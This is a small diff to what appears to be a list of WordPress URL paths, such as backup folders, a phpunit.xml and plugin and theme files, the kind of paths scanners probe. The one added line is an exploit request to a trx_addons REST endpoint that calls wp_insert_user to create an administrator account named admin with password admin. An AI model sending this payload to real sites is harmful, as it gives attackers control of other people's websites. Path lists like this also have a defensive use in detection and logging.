@@ -5,6 +5,7 @@
 /blog/wp-content/backups/
 /blog/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/phpunit.xml
 /cms/wp-content/themes/AdvanceImage5/functions.php
+/wp-json/trx_addons/V2/get/sc_layout?sc=wp_insert_user&role=administrator&user_login=admin&user_pass=admin
 /contest/wp-content/plugins/wp-postratings/images/squares/
 /giacc/wp-content/plugins/tablepress/css/default.min.css
 /giacc/wp-content/plugins/wptables/build/css/wptables.min.css
